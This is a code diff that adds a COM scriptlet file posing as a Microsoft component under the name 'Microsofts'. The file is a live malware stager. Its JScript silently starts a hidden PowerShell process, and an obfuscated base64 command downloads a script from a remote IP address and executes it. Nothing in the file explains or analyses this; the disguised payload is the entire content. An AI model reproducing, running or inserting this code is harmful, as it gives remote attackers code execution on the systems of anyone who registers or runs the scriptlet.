@@ -1,0 +1,21 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Microsofts"
+    progid="Microsofts"
+    version="1.00"
+    classid="{90AA3A4E-6764-44B7-A1B9-55F57183CDB0}"
+    remotable="true"
+	>
+</registration>
+
+<script language="JScript">
+<![CDATA[
+
+	var r = new ActiveXObject("WScript.Shell").Run("powershell /w 1 /C \"s\'\'v mm -;s\'\'v Dp e\'\'c;s\'\'v DTs ((g\'\'v mm).value.toString()+(g\'\'v Dp).value.toString());powershell (g\'\'v DTs).value.toString() (\'cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANAAwAC4AOAAyAC4AMQA4AC4AMgAwADkAOgAxADEAMgA0ADAALwBpAG4AZABlAHgALgBoAHQAbQBsACcAKQApACIACgA\'+\'=\')\"", 0, true);
+
+]]>
+</script>
+
+</scriptlet>
